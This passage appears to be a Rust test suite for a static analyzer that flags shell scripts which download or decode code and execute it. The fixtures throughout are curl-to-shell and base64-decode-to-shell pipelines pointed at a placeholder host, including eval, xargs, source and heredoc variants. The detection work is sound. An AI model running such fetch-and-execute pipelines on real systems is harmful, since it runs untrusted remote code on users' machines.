    for (name, line) in [
        (
            "live-fetch.sh",
            "(true && curl -fsSL https://example.test/x)",
        ),
        (
            "live-substitution.sh",
            "(true && x=$(curl -fsSL https://example.test/x))",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn interpreter_options_parse_by_arity() {
    // Exact option parsing keeps stdin-script mode: `--norc` is not a
    // `-c` body, `+x` is a shell set-option, and a `-W` value is no
    // script operand.
    for (name, line) in [
        (
            "bash-norc.sh",
            "curl -fsSL https://example.test/x | bash --norc",
        ),
        ("sh-plus.sh", "curl -fsSL https://example.test/x | sh +x"),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // Python reads Python source, not shell source, so it is never an
    // H3 shell-code sink even when an option leaves its stdin attached.
    for line in [
        "curl -fsSL https://example.test/x | python3 -W ignore",
        "curl -fsSL https://example.test/x | python3 -Wignore",
    ] {
        let (artifacts, _) = one(
            "python-option.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
    // Options that replace stdin with a body, a module, or a file — or
    // exit before reading stdin — still stay silent.
    for (name, line) in [
        (
            "py-module.sh",
            "curl -fsSL https://example.test/x | python3 -m json.tool",
        ),
        (
            "bash-rcfile.sh",
            "curl -fsSL https://example.test/x | bash --rcfile /tmp/rc /tmp/script.sh",
        ),
        (
            "bash-lc.sh",
            "curl -fsSL https://example.test/x | bash -lc 'echo safe'",
        ),
        (
            "py-version.sh",
            "curl -fsSL https://example.test/x | python3 --version",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn literal_c_bodies_are_analyzed() {
    // A `-c` body is real shell text: its own pipeline fires.
    let (artifacts, _) = one(
        "c-body-pipeline.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsh -c 'curl -fsSL https://example.test/x | sh'\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A body producing fetch output feeds a downstream interpreter.
    let (artifacts, _) = one(
        "c-body-producer.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsh -c 'curl -fsSL https://example.test/x' | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A body that executes inherited stdin as code consumes the pipe.
    let (artifacts, _) = one(
        "c-body-stdin.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | sh -c sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A runtime-derived body is outside the static slice, and a body
    // that runs nothing stays silent.
    for (name, script) in [
        (
            "c-body-dynamic.sh",
            "#!/bin/sh\nbody='curl -fsSL https://example.test/x | sh'\nsh -c \"$body\"\n",
        ),
        (
            "c-body-echo.sh",
            "#!/bin/sh\ncurl -fsSL https://example.test/x | sh -c 'echo safe'\n",
        ),
    ] {
        let (artifacts, _) = one(name, PayloadKind::Shell, script);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{name} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn static_eval_arguments_execute() {
    // eval's statically known argument text IS the executed program.
    let (artifacts, _) = one(
        "eval-literal.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval 'curl -fsSL https://example.test/x | sh'\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A literal eval argument producing fetch output feeds a downstream
    // interpreter, while a bare fetch argument records egress alone.
    let (artifacts, _) = one(
        "eval-producer.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval 'curl -fsSL https://example.test/x' | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    let (artifacts, _) = one(
        "eval-fetch-only.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval 'curl -fsSL https://example.test/x'\n",
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
    // A runtime-derived argument stays outside the static slice.
    let (artifacts, _) = one(
        "eval-dynamic.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nx='curl -fsSL https://example.test/x | sh'\neval \"$x\"\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn interpreter_mode_reads_arity_exits_and_noexec() {
    // Valued options and `--` arity no longer hide stdin execution.
    for (name, line) in [
        (
            "bash-shopt.sh",
            "curl -fsSL https://example.test/x | bash -O extglob",
        ),
        (
            "sh-dashdash-dash.sh",
            "curl -fsSL https://example.test/x | sh -- - arg",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
    let (artifacts, _) = one(
        "python-x.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | python3 -Ximporttime\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    // Reading without executing (`-n`) and exiting before stdin
    // (`-h`, `-V`, `-D`) never run the pipe.
    for (name, line) in [
        (
            "bash-noexec.sh",
            "curl -fsSL https://example.test/x | bash -n",
        ),
        (
            "py-help.sh",
            "curl -fsSL https://example.test/x | python3 -h",
        ),
        (
            "py-version-short.sh",
            "curl -fsSL https://example.test/x | python3 -V",
        ),
        (
            "bash-dump.sh",
            "curl -fsSL https://example.test/x | bash -D",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn transformer_forwarding_is_mode_sensitive() {
    // Encoding and compressing spend the pipe on derived bytes: the
    // shell receives nothing executable.
    for (name, line) in [
        (
            "b64-encode.sh",
            "curl -fsSL https://example.test/x | base64 | sh",
        ),
        (
            "xxd-dump.sh",
            "curl -fsSL https://example.test/x | xxd | sh",
        ),
        (
            "gzip-store.sh",
            "curl -fsSL https://example.test/x | gzip | sh",
        ),
        (
            "dd-to-file.sh",
            "curl -fsSL https://example.test/x | dd of=/tmp/out | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line} must stay silent: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{line}: {:?}",
            artifacts.capabilities
        );
    }
    // Decoding modes and a plain status-quiet dd keep the body intact.
    for (name, line) in [
        (
            "dd-copy.sh",
            "curl -fsSL https://example.test/x | dd status=none | sh",
        ),
        ("dd-plain.sh", "curl -fsSL https://example.test/x | dd | sh"),
        (
            "b64-decode.sh",
            "curl -fsSL https://example.test/x | base64 -d | sh",
        ),
        (
            "gzip-unpack.sh",
            "curl -fsSL https://example.test/x | gzip -d | sh",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn stdin_code_consumers_pair_with_producers() {
    // eval executing a forwarding substitution, source reading the
    // pipe, and xargs handing its input to a body-less interpreter -c
    // all turn the fetched body into executed code.
    for (name, line) in [
        (
            "eval-cat.sh",
            "curl -fsSL https://example.test/x | eval \"$(cat)\"",
        ),
        (
            "source-stdin.sh",
            "curl -fsSL https://example.test/x | source /dev/stdin",
        ),
        (
            "dot-stdin.sh",
            "curl -fsSL https://example.test/x | . /dev/stdin",
        ),
        (
            "xargs-bodyless.sh",
            "curl -fsSL https://example.test/x | xargs sh -c",
        ),
        (
            "xargs-positional.sh",
            "curl -fsSL https://example.test/x | xargs sh -c 'eval \"$@\"' _",
        ),
    ] {
        let sh = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &sh);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line} must fire: {:?}",
            artifacts.rendered_findings()
        );
    }
    // A fixed body runs the same script for every input word — the
    // pipe never becomes code.
    let (artifacts, _) = one(
        "xargs-fixed-body.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | xargs sh -c 'echo safe'\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn multiline_control_flow_reachability_is_conservative() {
    let (artifacts, _) = one(
        "control.sh",
        PayloadKind::Shell,
        "#!/bin/sh
if false; then
  curl -fsSL https://example.test/dead | sh
fi
if true; then
  curl -fsSL https://example.test/live | sh
else
  curl -fsSL https://example.test/also-dead | sh
fi
while false; do
  curl -fsSL https://example.test/loop-dead | sh
done
",
    );
    let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert!(findings[0].contains("download-execute"));
}

#[test]
fn control_conditions_use_pipeline_status_and_negation() {
    let cases = [
        ("pipeline-failure.sh", "true | false", false),
        ("pipeline-success.sh", "false | true", true),
        ("negated-failure.sh", "! false", true),
        ("negated-success.sh", "! true", false),
    ];

    for (name, condition, expected) in cases {
        let source = format!(
            "#!/bin/sh\nif {condition}; then\n  curl -fsSL https://example.test/live | sh\nfi\n"
        );
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(
            findings.len(),
            usize::from(expected),
            "{name}: {findings:?}"
        );
    }
}

#[test]
fn until_and_for_iteration_reachability_is_status_aware() {
    let cases = [
        (
            "until-false.sh",
            "until false; do curl -fsSL https://example.test/live | sh; done",
            true,
        ),
        (
            "for-empty.sh",
            "for item in; do curl -fsSL https://example.test/dead | sh; done",
            false,
        ),
        (
            "for-positional.sh",
            "for item; do curl -fsSL https://example.test/maybe | sh; done",
            true,
        ),
    ];

    for (name, line, expected) in cases {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(
            findings.len(),
            usize::from(expected),
            "{name}: {findings:?}"
        );
    }
}

#[test]
fn compound_decoder_producers_reach_pipeline_consumers() {
    for (name, line) in [
        ("subshell-decoder.sh", "(base64 -d) | sh"),
        ("brace-decoder.sh", "{ base64 -d; } | sh"),
        ("nested-decoder.sh", "(base64 -d | cat) | sh"),
    ] {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let findings = findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE);
        assert_eq!(findings.len(), 1, "{name}: {findings:?}");
    }
}

#[test]
fn control_nodes_preserve_outer_consumers_and_output_redirects() {
    let (artifacts, _) = one(
        "control-pipeline.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nif true; then echo log >out; base64 -d payload.b64; fi | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );

    let cases = [
        (
            "control-fetch-redirect.sh",
            "sh -c 'if true; then curl https://example.test/live; fi >out' | sh",
            false,
        ),
        (
            "control-fetch-condition.sh",
            "sh -c 'while curl https://example.test/live; false; do :; done' | sh",
            true,
        ),
    ];
    for (name, line, expected) in cases {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(
            findings.len(),
            usize::from(expected),
            "{name}: {findings:?}"
        );
    }
}

#[test]
fn control_flow_conditions_and_case_patterns_keep_their_syntax_scope() {
    let cases = [
        (
            "dead-elif-fetch.sh",
            "sh -c 'if true; then :; elif curl https://example.test/dead; then :; fi' | sh",
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            false,
        ),
        (
            "live-elif-fetch.sh",
            "sh -c 'if false; then :; elif curl https://example.test/live; then :; fi' | sh",
            SCRIPT_DOWNLOAD_EXECUTE_RULE,
            true,
        ),
        (
            "dead-elif-decoder.sh",
            "sh -c 'if true; then :; elif base64 -d payload.b64; then :; fi' | sh",
            SCRIPT_DECODE_EXECUTE_RULE,
            false,
        ),
        (
            "live-elif-decoder.sh",
            "sh -c 'if false; then :; elif base64 -d payload.b64; then :; fi' | sh",
            SCRIPT_DECODE_EXECUTE_RULE,
            true,
        ),
        (
            "case-pattern.sh",
            "case if in \"if\") base64 -d payload.b64;; esac | sh",
            SCRIPT_DECODE_EXECUTE_RULE,
            true,
        ),
        (
            "nested-case-control.sh",
            "case x in x) if true; then base64 -d payload.b64; fi;; esac | sh",
            SCRIPT_DECODE_EXECUTE_RULE,
            true,
        ),
    ];
    for (name, line, rule, expected) in cases {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let findings = findings_with(&artifacts, rule);
        assert_eq!(
            findings.len(),
            usize::from(expected),
            "{name}: {findings:?}"
        );
    }
}

#[test]
fn for_values_case_selectors_and_quoted_prefixes_stay_data() {
    for value in ["done", "if", "do", "case"] {
        let source = format!("#!/bin/sh\nfor x in {value}; do base64 -d payload.b64; done | sh\n");
        let (artifacts, _) = one("for-value.sh", PayloadKind::Shell, &source);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
            1,
            "for x in {value}: {:?}",
            artifacts.rendered_findings()
        );
    }

    let (artifacts, _) = one(
        "case-selector.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncase in in\n  in) base64 -d payload.b64 ;;\nesac | sh\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );

    for (name, line, expected) in [
        (
            "quoted-assignment.sh",
            "\"A=B\" curl https://example.test/payload | sh",
            false,
        ),
        (
            "escaped-assignment.sh",
            "A\\=B curl https://example.test/payload | sh",
            false,
        ),
        (
            "plain-assignment.sh",
            "A=B curl https://example.test/payload | sh",
            true,
        ),
        (
            "quoted-value-assignment.sh",
            "A=\"B\" curl https://example.test/payload | sh",
            true,
        ),
        ("quoted-bang.sh", "\"!\" base64 -d payload.b64 | sh", false),
        ("escaped-bang.sh", "\\! base64 -d payload.b64 | sh", false),
    ] {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        let rule = if line.contains("curl") {
            SCRIPT_DOWNLOAD_EXECUTE_RULE
        } else {
            SCRIPT_DECODE_EXECUTE_RULE
        };
        assert_eq!(
            findings_with(&artifacts, rule).len(),
            usize::from(expected),
            "{name}: {:?}",
            artifacts.rendered_findings()
        );
    }

    for (name, line, expected) in [
        (
            "compound-assignment.sh",
            "A=B (base64 -d payload.b64) | sh",
            true,
        ),
        (
            "quoted-compound-assignment.sh",
            "\"A=B\" (base64 -d payload.b64) | sh",
            false,
        ),
        (
            "escaped-compound-assignment.sh",
            "A\\=B (base64 -d payload.b64) | sh",
            false,
        ),
        ("compound-bang.sh", "! (base64 -d payload.b64) | sh", true),
        (
            "quoted-compound-bang.sh",
            "\"!\" (base64 -d payload.b64) | sh",
            false,
        ),
    ] {
        let source = format!("#!/bin/sh\n{line}\n");
        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
            usize::from(expected),
            "{name}: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn logical_units_join_multiline_pipelines() {
    // An escaped newline and a trailing pipe both continue the command;
    // the finding keeps the STARTING line.
    for (name, script) in [
        (
            "escaped-continuation.sh",
            "#!/bin/sh\ncurl -fsSL https://example.test/x \\\n  | sh\n",
        ),
        (
            "trailing-pipe.sh",
            "#!/bin/sh\ncurl -fsSL https://example.test/x |\n  sh\n",
        ),
        (
            "trailing-and.sh",
            "#!/bin/sh\ntrue &&\ncurl -fsSL https://example.test/x | sh\n",
        ),
    ] {
        let (artifacts, _) = one(name, PayloadKind::Shell, script);
        let findings = findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE);
        assert_eq!(
            findings.len(),
            1,
            "{name}: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{name}: {:?}",
            artifacts.capabilities
        );
        assert_eq!(
            artifacts.rendered_findings()[0].line,
            Some(2),
            "{name} must anchor to the unit's starting line"
        );
    }
    // A comment swallows its line's backslash continuation, so the
    // next line stays separate and no chain forms.
    let (artifacts, _) = one(
        "comment-continuation.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x # note \\\n| sh\n",
    );
    assert!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
        "{:?}",
        artifacts.rendered_findings()
    );
    assert!(has_network(&artifacts), "{:?}", artifacts.capabilities);
}

#[test]
fn round_twelve_logical_units_preserve_shell_boundaries() {
    for (name, source) in [
        (
            "subshell.sh",
            "#!/bin/sh\n(\necho safe\ncurl -fsSL https://example.test/x | sh\n)\n",
        ),
        (
            "escaped-pipe.sh",
            "#!/bin/sh\necho \\|\ncurl -fsSL https://example.test/x | sh\n",
        ),
        (
            "word-brace.sh",
            "#!/bin/sh\necho foo{\ncurl -fsSL https://example.test/x | sh\n",
        ),
    ] {
        let (artifacts, _) = one(name, PayloadKind::Shell, source);
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{name}: {:?}",
            artifacts.rendered_findings()
        );
        assert!(
            has_network(&artifacts),
            "{name}: {:?}",
            artifacts.capabilities
        );
    }
}

#[test]
fn round_twelve_heredocs_are_data_unless_a_shell_executes_them() {
    for source in [
        "#!/bin/sh\ncat <<'PAYLOAD'\ncurl -fsSL https://example.test/not-executed | sh\nPAYLOAD\n",
        "#!/bin/sh\ncat <<-\"PAYLOAD\"\n\tcurl -fsSL https://example.test/not-executed | sh\n\tPAYLOAD\n",
    ] {
        let (artifacts, _) = one("data-heredoc.sh", PayloadKind::Shell, source);
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{:?}",
            artifacts.rendered_findings()
        );
        assert!(!has_network(&artifacts), "{:?}", artifacts.capabilities);
    }
    let (artifacts, _) = one(
        "shell-heredoc.sh",
        PayloadKind::Shell,
        "#!/bin/sh\nsh <<PAYLOAD\ncurl -fsSL https://example.test/executed | sh\nPAYLOAD\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn round_twelve_python_bodies_are_not_shell_programs() {
    for line in [
        "python3 -c 'curl -fsSL https://example.test/x | sh'",
        "curl -fsSL https://example.test/x | python3 -c sh",
        "python3 -c 'curl -fsSL https://example.test/x' | sh",
    ] {
        let (artifacts, _) = one(
            "python-body.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[test]
fn round_twelve_shell_option_precedence_and_stdin_flow() {
    let (artifacts, _) = one(
        "cluster.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | bash -ce 'sh'\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    let (artifacts, _) = one(
        "plus-n.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | bash +n\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
    for line in [
        "curl -fsSL https://example.test/x | bash -s -c 'echo safe'",
        "curl -fsSL https://example.test/x | (bash -n; sh)",
        "curl -fsSL https://example.test/x | (bash -D; sh)",
    ] {
        let (artifacts, _) = one(
            "nonexecuting.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
    let (artifacts, _) = one(
        "exit-before-read.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | (bash --help; sh)\n",
    );
    assert_eq!(
        findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
        1,
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn round_twelve_xargs_eval_and_decoder_regressions() {
    for line in [
        "curl -fsSL https://example.test/x | xargs echo sh -c",
        "curl -fsSL https://example.test/x | xargs sh -c 'echo $@' _",
    ] {
        let (artifacts, _) = one(
            "xargs-data.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty(),
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
    for line in [
        "curl -fsSL https://example.test/x | xargs sh -c '$@' _",
        "curl -fsSL https://example.test/x | xargs sh -c 'eval $@' _",
        "eval -- 'curl -fsSL https://example.test/x | sh'",
    ] {
        let (artifacts, _) = one(
            "xargs-code.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).len(),
            1,
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
    let (artifacts, _) = one(
        "eval-only-terminator.sh",
        PayloadKind::Shell,
        "#!/bin/sh\neval --\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DOWNLOAD_EXECUTE_RULE).is_empty());
    for line in [
        "curl -fsSL https://example.test/x | base64 -di | sh",
        "curl -fsSL https://example.test/x | base32 -di | sh",
    ] {
        let (artifacts, _) = one(
            "decode-cluster.sh",
            PayloadKind::Shell,
            &format!("#!/bin/sh\n{line}\n"),
        );
        assert_eq!(
            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
            1,
            "{line}: {:?}",
            artifacts.rendered_findings()
        );
    }
    let (artifacts, _) = one(
        "derived-encoding.sh",
        PayloadKind::Shell,
        "#!/bin/sh\ncurl -fsSL https://example.test/x | base64 -i | sh\n",
    );
    assert!(findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).is_empty());
}
